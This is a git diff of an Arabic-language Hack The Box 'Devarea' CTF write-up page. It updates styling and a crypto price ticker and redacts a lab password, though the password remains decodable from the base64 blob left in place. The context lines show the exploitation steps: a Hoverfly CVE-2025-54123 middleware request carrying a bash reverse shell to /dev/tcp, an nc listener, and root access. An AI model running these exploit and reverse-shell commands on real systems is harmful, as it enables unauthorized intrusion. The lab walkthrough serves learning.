@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <meta name="theme-color" content="#07110d">
+  <meta name="theme-color" content="#07101f">
   <meta name="color-scheme" content="dark light">
   <meta name="description" content="تقرير CTF تقني لتحدي Devarea HTB Write-up على منصة Hack The Box.">
   <title>Devarea HTB Write-up | Ft7y.Sec</title>
@@ -12,7 +12,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
-  <link rel="stylesheet" href="../style.css?v=20261009-visual-refresh-ccdd949">
+  <link rel="stylesheet" href="../style.css?v=20261010-market-glass">
   <link rel="icon" href="../avatar.png" type="image/png">
     <link rel="canonical" href="https://fysoul22.github.io/ft7.cv.github.io/ctfs/devarea.html">
     <meta property="og:type" content="website">
@@ -30,16 +30,18 @@
   <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
   <div class="page-noise" aria-hidden="true"></div>
   <canvas id="particles-canvas"></canvas>
-  <aside class="market-strip" data-market-ticker aria-label="أسعار استرشادية للعملات">
+  <aside class="market-strip" data-market-ticker aria-label="أسعار العملات التقديرية">
   <div class="market-strip-inner">
     <div class="market-brand"><span class="market-live-dot" aria-hidden="true"></span><span>مؤشرات السوق</span><small>تحديث كل ساعة</small></div>
     <ul class="market-assets">
-      <li class="market-asset" data-market="USD_EGP"><span class="market-coin coin-usd" aria-hidden="true">$</span><span class="market-code">USD/EGP</span><strong data-price>—</strong></li>
-      <li class="market-asset" data-market="BTC"><span class="market-coin coin-btc" aria-hidden="true">₿</span><span class="market-code">BTC</span><strong data-price>—</strong></li>
-      <li class="market-asset" data-market="ETH"><span class="market-coin coin-eth" aria-hidden="true">◇</span><span class="market-code">ETH</span><strong data-price>—</strong></li>
-      <li class="market-asset" data-market="BNB"><span class="market-coin coin-bnb" aria-hidden="true">B</span><span class="market-code">BNB</span><strong data-price>—</strong></li>
-      <li class="market-asset" data-market="SOL"><span class="market-coin coin-sol" aria-hidden="true">≋</span><span class="market-code">SOL</span><strong data-price>—</strong></li>
-    </ul><div class="market-foot"><span data-market-status role="status" aria-live="polite">جارٍ جلب الأسعار…</span><span class="market-sources">المصدر: <a href="https://www.binance.com/" target="_blank" rel="noopener noreferrer">Binance</a> · <a href="https://www.exchangerate.fun/docs/" target="_blank" rel="noopener noreferrer">ExchangeRate.fun</a></span></div>
+      <li class="market-asset" data-market="BTC"><button class="market-asset-button" type="button" aria-label="بيتكوين BTC" aria-expanded="false"><img class="market-coin" src="../assets/images/market/btc.svg" alt="" aria-hidden="true" width="18" height="18"><span class="market-label"><span class="market-code">BTC</span><span class="market-name">بيتكوين</span></span><strong data-price dir="ltr">—</strong></button></li>
+      <li class="market-asset" data-market="ETH"><button class="market-asset-button" type="button" aria-label="إيثيريوم ETH" aria-expanded="false"><img class="market-coin" src="../assets/images/market/eth.svg" alt="" aria-hidden="true" width="18" height="18"><span class="market-label"><span class="market-code">ETH</span><span class="market-name">إيثيريوم</span></span><strong data-price dir="ltr">—</strong></button></li>
+      <li class="market-asset" data-market="SOL"><button class="market-asset-button" type="button" aria-label="سولانا SOL" aria-expanded="false"><img class="market-coin" src="../assets/images/market/sol.svg" alt="" aria-hidden="true" width="18" height="18"><span class="market-label"><span class="market-code">SOL</span><span class="market-name">سولانا</span></span><strong data-price dir="ltr">—</strong></button></li>
+      <li class="market-asset" data-market="BNB"><button class="market-asset-button" type="button" aria-label="بي إن بي BNB" aria-expanded="false"><img class="market-coin" src="../assets/images/market/bnb.svg" alt="" aria-hidden="true" width="18" height="18"><span class="market-label"><span class="market-code">BNB</span><span class="market-name">بي إن بي</span></span><strong data-price dir="ltr">—</strong></button></li>
+      <li class="market-asset" data-market="XMR"><button class="market-asset-button" type="button" aria-label="مونيرو XMR" aria-expanded="false"><img class="market-coin" src="../assets/images/market/xmr.svg" alt="" aria-hidden="true" width="18" height="18"><span class="market-label"><span class="market-code">XMR</span><span class="market-name">مونيرو</span></span><strong data-price dir="ltr">—</strong></button></li>
+      <li class="market-asset" data-market="EGP"><button class="market-asset-button" type="button" aria-label="الجنيه المصري EGP، سعر الجنيه الواحد بالدولار" aria-expanded="false"><span class="market-coin coin-egp" aria-hidden="true">EGP<br>ج.م</span><span class="market-label"><span class="market-code">EGP</span><span class="market-name">الجنيه المصري</span></span><strong data-price dir="ltr">—</strong></button></li>
+    </ul>
+    <div class="market-foot"><span data-market-status role="status" aria-live="polite">جارٍ جلب الأسعار…</span><span class="market-sources">أسعار USDT تقريبية بالدولار · <a href="https://www.binance.com/" target="_blank" rel="noopener noreferrer">Binance</a> · <a href="https://www.exchangerate.fun/docs/" target="_blank" rel="noopener noreferrer">ExchangeRate.fun</a></span></div>
   </div>
 </aside>
 
@@ -316,7 +318,7 @@ dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false</code></pre>
 
 
 
-&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=&quot;http://devarea.htb/&quot;&gt;&lt;return&gt;Report received from null. Department: null. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre></section><p>بنفس الطريقة قمنا بفك تشفيره  وبالفعل اكتشفنا بداخله اسم مستخدم  admin  وكلمة مرور  O7IJ27MyyXiU</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &quot;W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg&quot; | base64 -d
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=&quot;http://devarea.htb/&quot;&gt;&lt;return&gt;Report received from null. Department: null. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre></section><p>بنفس الطريقة قمنا بفك تشفيره  وبالفعل اكتشفنا بداخله اسم مستخدم  admin  وكلمة مرور  [REDACTED_LAB_PASSWORD]</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &quot;W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg&quot; | base64 -d
 [Unit]
 Description=HoverFly service
 After=network.target
@@ -325,7 +327,7 @@ After=network.target
 User=dev_ryan
 Group=dev_ryan
 WorkingDirectory=/opt/HoverFly
-ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED_LAB_PASSWORD] -listen-on-host 0.0.0.0
 
 Restart=on-failure
 RestartSec=5
@@ -338,7 +340,7 @@ StandardError=journal
 [Install]
 WantedBy=multi-user.target</code></pre></section><p>قمنا بالرجوع الى صفحة تسجيل دخول  hoverfly وستخدمنا ال user name  وال password الي وجدناهم في hoverfly .service&lt;br&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-8.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-9.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><p>خد بالك من اصدار ال hoverfly 	v1.11.3  وهو مصاب بثغرة  نجد الاستغلال الخاص بها هنا     CVE-2025-54123-Poc <a href="https://github.com/kasem545/CVE-2025-54123-Poc/tree/main" target="_blank" rel="noopener noreferrer">https://github.com/kasem545/CVE-2025-54123-Poc/tree/main</a>&lt;br&gt;&lt;br&gt;1. شغل Listener :   nc -lvnp 4444</p><p>2.نفذ الامر التالي :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>curl -X PUT &quot;http://10.129.244.208:8888/api/v2/hoverfly/middleware&quot; \
 -H &quot;Content-Type: application/json&quot; \
--H &quot;Authorization: Bearer $(curl -s -X POST http://10.129.244.208:8888/api/token-auth -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;O7IJ27MyyXiU&quot;}&#39; | jq -r &#39;.token&#39;)&quot; \
+-H &quot;Authorization: Bearer $(curl -s -X POST http://10.129.244.208:8888/api/token-auth -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;[REDACTED_LAB_PASSWORD]&quot;}&#39; | jq -r &#39;.token&#39;)&quot; \
 -d &#39;{
   &quot;binary&quot;: &quot;/bin/bash&quot;,
   &quot;script&quot;: &quot;bash -i &gt;&amp; /dev/tcp/10.129.244.208/4444 0&gt;&amp;1&quot;
@@ -405,7 +407,7 @@ uid=0(root) gid=1001(dev_ryan) groups=1001(dev_ryan)
     <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
   </div></footer>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
-  <script src="../script.js"></script>
-    <script src="../assets/js/market-ticker.js" defer></script>
+  <script src="../script.js?v=20261010-night-sky"></script>
+    <script src="../assets/js/market-ticker.js?v=20261010-glass" defer></script>
 </body>
 </html>
